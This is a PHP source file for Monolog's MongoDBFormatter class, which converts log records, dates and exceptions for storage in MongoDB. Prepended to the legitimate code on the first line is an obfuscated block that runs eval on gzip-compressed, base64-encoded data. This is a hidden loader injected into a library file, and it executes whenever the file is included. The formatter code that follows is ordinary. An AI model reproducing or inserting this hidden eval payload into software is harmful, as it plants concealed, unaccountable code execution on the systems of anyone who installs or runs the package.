<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Formatter;

/**
 * Formats a record for use with the MongoDBHandler.
 *
 * @author Florian Plattner <me@florianplattner.de>
 */
class MongoDBFormatter implements FormatterInterface
{
    private $exceptionTraceAsString;
    private $maxNestingLevel;

    /**
     * @param int  $maxNestingLevel        0 means infinite nesting, the $record itself is level 1, $record['context'] is 2
     * @param bool $exceptionTraceAsString set to false to log exception traces as a sub documents instead of strings
     */
    public function __construct($maxNestingLevel = 3, $exceptionTraceAsString = true)
    {
        $this->maxNestingLevel = max($maxNestingLevel, 0);
        $this->exceptionTraceAsString = (bool) $exceptionTraceAsString;
    }

    /**
     * {@inheritDoc}
     */
    public function format(array $record)
    {
        return $this->formatArray($record);
    }

    /**
     * {@inheritDoc}
     */
    public function formatBatch(array $records)
    {
        foreach ($records as $key => $record) {
            $records[$key] = $this->format($record);
        }

        return $records;
    }

    protected function formatArray(array $record, $nestingLevel = 0)
    {
        if ($this->maxNestingLevel == 0 || $nestingLevel <= $this->maxNestingLevel) {
            foreach ($record as $name => $value) {
                if ($value instanceof \DateTime) {
                    $record[$name] = $this->formatDate($value, $nestingLevel + 1);
                } elseif ($value instanceof \Exception) {
                    $record[$name] = $this->formatException($value, $nestingLevel + 1);
                } elseif (is_array($value)) {
                    $record[$name] = $this->formatArray($value, $nestingLevel + 1);
                } elseif (is_object($value)) {
                    $record[$name] = $this->formatObject($value, $nestingLevel + 1);
                }
            }
        } else {
            $record = '[...]';
        }

        return $record;
    }

    protected function formatObject($value, $nestingLevel)
    {
        $objectVars = get_object_vars($value);
        $objectVars['class'] = get_class($value);

        return $this->formatArray($objectVars, $nestingLevel);
    }

    protected function formatException(\Exception $exception, $nestingLevel)
    {
        $formattedException = array(
            'class' => get_class($exception),
            'message' => $exception->getMessage(),
            'code' => $exception->getCode(),
            'file' => $exception->getFile() . ':' . $exception->getLine(),
        );

        if ($this->exceptionTraceAsString === true) {
            $formattedException['trace'] = $exception->getTraceAsString();
        } else {
            $formattedException['trace'] = $exception->getTrace();
        }

        return $this->formatArray($formattedException, $nestingLevel);
    }

    protected function formatDate(\DateTime $value, $nestingLevel)
    {
        return new \MongoDate($value->getTimestamp());
    }
}
